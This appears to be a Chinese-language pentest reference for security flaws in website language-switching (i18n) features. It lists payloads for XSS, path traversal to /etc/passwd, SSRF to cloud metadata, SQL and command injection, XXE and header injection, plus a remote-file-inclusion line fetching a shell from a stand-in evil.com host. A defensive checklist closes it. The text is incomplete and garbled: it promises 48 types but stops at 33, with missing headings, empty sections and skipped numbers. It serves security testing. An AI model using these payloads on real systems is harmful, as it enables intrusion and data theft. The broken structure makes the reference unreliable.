# 多语言参考

## 概述
本文档列出在网站多语言/国际化(i18n)功能中可能存在的48种安全漏洞类型，用于系统化测试。

---

## 1. XSS (跨站脚本攻击)
- 翻译内容未转义直接输出
- URL参数中的语言标识符注入
- Cookie/Session中的语言偏好注入
- HTTP Header (Accept-Language) 注入
- DOM-based XSS: 前端路由解析语言参数
- DOM-based XSS: `document.location.hash`处理不当
- DOM-based XSS: `innerHTML`插入翻译内容

**测试 Payload:**
```
?lang=<script>alert(1)</script>
?lang=en"><img src=x onerror=alert(1)>
Accept-Language: <script>alert(1)</script>
Cookie: lang=<svg/onload=alert(1)>
```

---

## 2. Open Redirect (开放重定向)
- 语言切换参数被利用跳转到恶意域名
- `?lang=xxx&redirect=evil.com`
- hreflang链接被篡改

**测试 Payload:**
```
?lang=en&redirect=https://evil.com
?next=https://evil.com&lang=en
?returnUrl=//evil.com&lang=zh
```

---

## 3. HTTP Parameter Pollution (HPP)
- 多个语言参数导致解析歧义
- `?lang=en&lang=<script>`

**测试 Payload:**
```
?lang=en&lang=<script>alert(1)</script>
?lang=en;lang=<script>alert(1)</script>
```

---

## 4. Cache Poisoning (缓存投毒)
- 通过语言参数污染CDN缓存
- 不同语言版本缓存混淆
- Vary头配置不当

**测试方法:**
```http
GET /page?lang=<script>alert(1)</script>
Host: target.com

# 检查其他用户是否看到被污染的缓存
```

---

## 5. Path Traversal (路径遍历)
- 语言代码用于文件路径拼接
- `../../etc/passwd` 通过语言参数
- 示例: `/lang/../../../config`

**测试 Payload:**
```
?lang=../../../../etc/passwd
?lang=..%2f..%2f..%2f..%2fetc%2fpasswd
/lang/../../../config/database.yml
```

---

## 6. Server-Side Request Forgery (SSRF)
- 语言资源从远程URL加载
- 内部服务通过语言接口访问

**测试 Payload:**
```
?lang=http://169.254.169.254/latest/meta-data/
?lang=http://localhost:8080/admin
?lang=http://internal-api.local/translations
```

---

## 7. Content Spoofing (内容伪造)
- 翻译文件被篡改显示虚假内容
- 钓鱼页面伪装成多语言站点

**测试方法:**
- 修改翻译文件显示虚假登录表单
- 篡改支付页面金额显示

---

## 8. Locale-Based Attacks (区域设置攻击)
- 特殊字符绕过过滤 (`ı` vs `i`)
- Unicode规范化问题
- 大小写转换漏洞

**测试 Payload:**
```
用户名: admin → ADMİN (土耳其语 İ)
文件名: test.php → test．php (全角点)
```

---

## 9. Business Logic Flaws (业务逻辑缺陷)
- 价格/货币通过语言参数篡改
- 权限检查依赖语言设置
- 敏感操作未验证语言上下文

**测试场景:**
```
?lang=en&currency=USD&price=100
?lang=zh&currency=CNY&price=1 (应该6.5)
```

---

## 10. Header Injection (头部注入)
- Accept-Language头注入CRLF
- Content-Language头操纵

**测试 Payload:**
```
Accept-Language: en\r\nSet-Cookie: admin=true
Accept-Language: en%0d%0aSet-Cookie:%20admin=true
```

---

## 11. XML External Entity (XXE)
- 语言配置文件为XML格式
- 外部实体引用加载恶意DTD

**测试 Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lang [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<lang>&xxe;</lang>
```

---

## 12. JSONP Hijacking
- 多语言API使用JSONP回调
- 跨域数据窃取

**测试 Payload:**
```
/api/translations?callback=stealData&lang=en
```

---

## 13. CORS Misconfiguration
- 语言子域CORS策略宽松
- `*.example.com` 通配符允许

**测试方法:**
```http
Origin: https://evil.example.com
Access-Control-Allow-Origin: *
```

---

## 14. Denial of Service (DoS)
- 大量语言请求耗尽资源
- 复杂正则处理特殊语言字符
- 递归语言回退导致栈溢出

**测试 Payload:**
```
发送10000个不同语言代码的请求
?lang=aaaaaaaaaaaaaaaaaaaaaaa (超长字符串)
```

---

## 15. Authentication Bypass (认证绕过)
- 语言切换时Session失效但未重建
- 某些语言路径跳过安全检查

**测试场景:**
```
1. 登录后切换语言
2. 检查Session是否保持
3. 尝试访问/en/admin vs /zh/admin
```

---

## 16. SQL Injection (SQL注入)
- 语言参数直接拼接到查询
- 排序/过滤基于语言选择

**测试 Payload:**
```
?lang=' OR '1'='1
?lang=' UNION SELECT username,password FROM users --
```

---

## 17. Command Injection (命令注入)
- 服务端调用外部翻译工具
- 语言代码传入系统命令

**测试 Payload:**
```
?lang=en;cat /etc/passwd
?lang=$(whoami)
?lang=| ls -la
```

---

## 18. File Inclusion (文件包含)
- LFI: `?lang=../../../../etc/passwd`
- RFI: `?lang=http://evil.com/shell.php`

**测试 Payload:**
```
?lang=../../../../etc/passwd
?lang=http://evil.com/malicious.php
?lang=php://filter/convert.base64-encode/resource=config
```

---

## 19. Unicode Vulnerabilities
- Homograph攻击 (相似字符欺骗)
- BOM头注入
- RTL/LTR方向覆盖攻击

**测试 Payload:**
```
域名: exаmple.com (а是西里尔字母)
文本: ‮翻转文本‬ (RTL覆盖)
```

---

## 20. Session Fixation (会话固定)
- 切换语言时Session ID未更新
- 攻击者预设Session后诱导切换语言

**测试步骤:**
```
1. 获取Session ID
2. 诱导受害者使用该Session
3. 受害者切换语言
4. 检查Session ID是否变化
```

---

## 21. CSRF (跨站请求伪造)
- 语言偏好修改无CSRF Token
- 通过恶意网站强制切换语言

**测试 Payload:**
```html
<img src="https://target.com/settings?lang=ar" />
<form action="https://target.com/settings" method="POST">
  <input name="lang" value="rtl-lang" />
</form>
```

---

## 22. Race Condition (竞态条件)
- 并发语言切换导致状态不一致
- 缓存写入竞争

**测试方法:**
```python
import threading
def switch_lang():
    requests.post('/settings', data={'lang': random_lang()})

threads = [threading.Thread(target=switch_lang) for _ in range(100)]
for t in threads: t.start()
```

---

## 23. Insecure Deserialization (不安全反序列化)
- 语言配置对象反序列化
- Cookie中存储序列化语言数据

**测试 Payload:**
```
Cookie: lang=TzoyMDoiTHFuZ3VhZ2VDb25maWciOjE6e3M6NDoibGFuZyI7czo...
(Python pickle, Java Serializable, PHP serialize)
```

---

## 24. Prototype Pollution (原型污染)
- JavaScript多语言库使用`merge`函数
- `__proto__`注入影响全局

**测试 Payload:**
```javascript
?lang=__proto__.isAdmin=true
?lang=constructor.prototype.isAdmin=true
```

---

## 25. Clickjacking (点击劫持)
- 语言选择器被iframe覆盖
- 隐藏层诱导点击特定语言

**测试 HTML:**
```html
<iframe src="https://target.com/settings" style="opacity:0.1"></iframe>
<div style="position:absolute;top:100px;left:100px">Click Me!</div>
```

---

## 26. Subdomain Takeover (子域名接管)
- `fr.example.com` DNS记录指向已删除服务
- CNAME记录未清理

**测试方法:**
```bash
dig fr.example.com
nslookup de.example.com
# 检查CNAME指向是否存在
```

---

## 27. HTTP Response Splitting
- 语言参数注入换行符
- `Set-Cookie`头分裂攻击

**测试 Payload:**
```
?lang=en%0d%0aSet-Cookie:%20admin=true
?lang=en\r\nContent-Length:\x200\r\n\r\nHTTP/1.1\x20200\x20OK
```

- XML语言文件查询拼接用户输入
- `/translations/lang[@code='USER_INPUT']`

**测试 Payload:**

## 29. LDAP Injection
- 语言资源从LDAP目录读取
- 过滤器注入特殊字符

## 30. Template Injection (模板注入)
- 服务端模板引擎渲染翻译

- Twig/Jinja2/FreeMarker漏洞

**测试 Payload:**
```

?lang=${7*7}
?lang=<%= 7*7 %>
```


## 33. IDOR (不直接对象引用)


## 测试流程建议

### 阶段 1: 信息收集
1. 识别所有语言切换点
   - URL参数: `?lang=en`
   - Cookie: `lang=zh`
   - Session存储
   - HTTP Header: `Accept-Language`
   - 子域名: `en.example.com`
   - 路径: `/en/page`

2. 确定技术栈
   - 后端框架 (Spring, Django, Rails等)
   - 前端框架 (React, Vue, Angular)
   - 国际化库 (i18next, react-intl等)
   - 翻译文件格式 (.po, .json, .xml, .yml)

### 阶段 2: 自动化扫描
```bash
# OWASP ZAP / Burp Suite 主动扫描
# 针对所有语言参数进行测试

# sqlmap (如果怀疑SQL注入)
sqlmap -u "http://target.com/page?lang=en" --level=3 --risk=2

# Nikto
nikto -h http://target.com -Plugins i18n
```

### 阶段 3: 手动测试
按优先级测试:
1. **高危**: XSS, SQL注入, SSRF, 文件包含
2. **中危**: Open Redirect, CSRF, IDOR
3. **低危**: Cache Poisoning, DoS, 信息泄露

### 阶段 4: 高级测试
- 竞态条件
- 原型污染
- 模板注入
- Unicode攻击

## 快速检查清单

- [ ] 所有语言参数都经过白名单验证
- [ ] 翻译内容输出时正确转义
- [ ] 语言切换有CSRF保护
- [ ] Session在语言切换时重新生成
- [ ] 语言文件路径无法被遍历
- [ ] CDN缓存正确配置Vary头
- [ ] 无开放重定向漏洞
- [ ] CORS策略严格限制
- [ ] 错误信息不泄露内部路径
- [ ] 语言包上传有严格验证

## 防御建议

### 开发侧
```java
// ✅ 白名单验证
private static final Set<String> ALLOWED_LANGS = 
    Set.of("en", "zh", "ja", "ko");

if (!ALLOWED_LANGS.contains(lang)) {
    throw new IllegalArgumentException("Invalid language");
}

// ✅ 正确转义输出
out.println(escapeHtml(translation));

// ✅ 使用参数化查询
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM translations WHERE lang = ?");
stmt.setString(1, lang);
```

### 运维侧
- 配置正确的Vary头: `Vary: Accept-Language`
- 限制语言参数长度
- 监控异常语言请求
- 定期审计翻译文件
